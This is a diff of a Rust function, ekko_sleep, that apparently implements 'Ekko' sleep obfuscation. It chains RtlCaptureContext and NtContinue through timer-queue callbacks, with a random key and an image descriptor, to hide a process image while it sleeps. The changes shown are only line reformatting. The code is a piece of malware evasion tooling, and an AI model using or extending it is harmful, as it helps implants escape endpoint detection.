@@ -219,7 +219,8 @@ unsafe fn ekko_sleep(timeout_ms: u32) -> Result<bool, ()> {
         return Err(());
     }
 
-    let rtl_capture: FnCaptureContext = core::mem::transmute(resolve(ntdll, b"RtlCaptureContext\0"));
+    let rtl_capture: FnCaptureContext =
+        core::mem::transmute(resolve(ntdll, b"RtlCaptureContext\0"));
     let nt_continue: FnNtContinue = core::mem::transmute(resolve(ntdll, b"NtContinue\0"));
     let rtl_create_queue: FnCreateTimerQueue =
         core::mem::transmute(resolve(ntdll, b"RtlCreateTimerQueue\0"));
@@ -248,7 +249,11 @@ unsafe fn ekko_sleep(timeout_ms: u32) -> Result<bool, ()> {
     // 一次性 key + 镜像描述
     let mut key = [0u8; 16];
     fill_random(&mut key);
-    let key_str = UString { length: 16, max_length: 16, buffer: key.as_mut_ptr() };
+    let key_str = UString {
+        length: 16,
+        max_length: 16,
+        buffer: key.as_mut_ptr(),
+    };
     let img_str = UString {
         length: size as u32,
         max_length: size as u32,
@@ -281,9 +286,15 @@ unsafe fn ekko_sleep(timeout_ms: u32) -> Result<bool, ()> {
     let mut timer = 0usize;
     let mut due = 100u32;
     if rtl_create_timer(
-        queue, &mut timer, rtl_capture as usize, &mut timer_ctx as *mut _ as usize,
-        due, 0, WT_EXECUTEINTIMERTHREAD,
-    ) != 0 {
+        queue,
+        &mut timer,
+        rtl_capture as usize,
+        &mut timer_ctx as *mut _ as usize,
+        due,
+        0,
+        WT_EXECUTEINTIMERTHREAD,
+    ) != 0
+    {
         rtl_delete_queue(queue);
         nt_close(evt_timer);
         nt_close(evt_start);
@@ -294,9 +305,15 @@ unsafe fn ekko_sleep(timeout_ms: u32) -> Result<bool, ()> {
 
     // 通知上下文已捕获
     if rtl_create_timer(
-        queue, &mut timer, set_event_cb as *const () as usize, evt_timer as usize,
-        due, 0, WT_EXECUTEINTIMERTHREAD,
-    ) != 0 {
+        queue,
+        &mut timer,
+        set_event_cb as *const () as usize,
+        evt_timer as usize,
+        due,
+        0,
+        WT_EXECUTEINTIMERTHREAD,
+    ) != 0
+    {
         rtl_delete_queue(queue);
         nt_close(evt_timer);
         nt_close(evt_start);
@@ -360,9 +377,15 @@ unsafe fn ekko_sleep(timeout_ms: u32) -> Result<bool, ()> {
     // 排入 7 个环节
     for c in rop.iter_mut() {
         if rtl_create_timer(
-            queue, &mut timer, nt_continue as usize, c as *mut Context as usize,
-            due, 0, WT_EXECUTEINTIMERTHREAD,
-        ) != 0 {
+            queue,
+            &mut timer,
+            nt_continue as usize,
+            c as *mut Context as usize,
+            due,
+            0,
+            WT_EXECUTEINTIMERTHREAD,
+        ) != 0
+        {
             rtl_delete_queue(queue);
             nt_close(evt_timer);
             nt_close(evt_start);
@@ -373,7 +396,8 @@ unsafe fn ekko_sleep(timeout_ms: u32) -> Result<bool, ()> {
     }
 
     // 主线程：原子 signal(evt_start) + wait(evt_delay)，期间 Rip 停在内核。
-    let status = nt_signal_and_wait_for_single_object(evt_start, evt_delay, 0, core::ptr::null_mut());
+    let status =
+        nt_signal_and_wait_for_single_object(evt_start, evt_delay, 0, core::ptr::null_mut());
 
     // 清理
     rtl_delete_queue(queue);
